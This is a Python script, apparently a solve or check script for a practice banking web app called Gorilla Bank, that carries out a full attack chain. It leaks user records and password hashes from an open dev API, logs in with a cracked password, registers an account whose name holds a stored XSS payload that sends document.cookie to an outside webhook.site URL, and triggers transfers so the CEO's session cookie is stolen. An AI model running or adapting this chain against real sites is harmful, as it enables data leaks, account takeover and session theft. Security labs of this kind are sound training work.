import requests
from hashlib import sha256
import time

PROD_URL = "http://localhost:5000"
DEV_URL = "http://localhost:6969"

# PROD_URL = "https://gorillabank.nl"
# DEV_URL = "https://dev.gorillabank.nl"


assert requests.get(f"{PROD_URL}/").status_code == 200, "Production server is not reachable"
assert requests.get(f"{DEV_URL}/").status_code == 200, "Production server is not reachable"

def assert_request_contains(url, expected_content, session=None):
    if session is None:
        session = requests.Session()
    print("Getting URL:", url, "with session:", session.cookies.get_dict())
    response = session.get(url, cookies = session.cookies.get_dict())
    response.raise_for_status()
    assert expected_content in response.text, f"Expected content '{expected_content}' not found in {url}: {response.text}"
    return True
assert_request_contains(f"{PROD_URL}/", "Gorilla Bank")
assert_request_contains(f"{PROD_URL}/", "/static/js/app.js")
assert_request_contains(f"{PROD_URL}/static/js/app.js", "/static/js/debug.js")
assert_request_contains(f"{PROD_URL}/static/js/app.js", "dev.gorillabank.nl")
assert_request_contains(f"{PROD_URL}/static/js/debug.js", "/api/")


def leak_user(id):
    response = requests.get(f"{DEV_URL}/api/user/{id}")
    response.raise_for_status()
    return response.json()
assert "ed807164fbfc81b594f3e74ac5a202b52e85bd0153bc046d33bda83fb980683f" == leak_user(5)["password_hash"], "User 5 password hash mismatch"
assert sha256(b"banana69").hexdigest() == leak_user(5)["password_hash"], "User 5 password hash mismatch with banana69"


def login(email, password):
    session = requests.Session()
    login_data = {"email": email, "password": password}

    response = session.post(f"{PROD_URL}/login", data=login_data)
    response.raise_for_status()
    assert "session" in session.cookies.get_dict()
    return session

def register(full_name, email, password):
    session = requests.Session()
    register_data = {
        "full_name": full_name,
        "email": email,
        "password": password,
    }
    response = session.post(f"{PROD_URL}/register", data=register_data)
    response.raise_for_status()
    assert "session" in session.cookies.get_dict()
    return session

def get_content(session, url):
    response = session.get(url)
    response.raise_for_status()
    return response.text

user_data = leak_user(5)
email = user_data["email"]
password = "banana69"

session_quinn = login(email, password)
print("Got session for Quinn:", session_quinn.cookies.get_dict())
assert_request_contains(f"{PROD_URL}/dashboard", "Good day, Barri", session=session_quinn)

import random
hacker_email = f"hacker{random.randint(1000, 999999)}@gorillabank.nl"
WEBHOOK = "https://webhook.site/aee6a336-21d2-4100-a5d1-e5c544ab8f6b"
hacked_session = register("Some Guy<script>fetch(`WEBHOOK/${document.cookie}`,{mode:'no-cors'})</script>".replace("WEBHOOK", WEBHOOK), hacker_email, password)

def transfer(session, to_user_email, amount, memo=""):
    transfer_data = {
        "to_user_email": to_user_email,
        "amount": str(amount),
        "memo": memo,
    }
    response = session.post(f"{PROD_URL}/transfer", data=transfer_data)
    response.raise_for_status()
    print(response.text)
    return response.text

transfer(session_quinn, hacker_email, 1)
transfer(hacked_session, "ceo@gorillabank.nl", 1)
print("Now wait for the ceo to visit his dashboard, after which the webhook will receive the admin's session cookie")

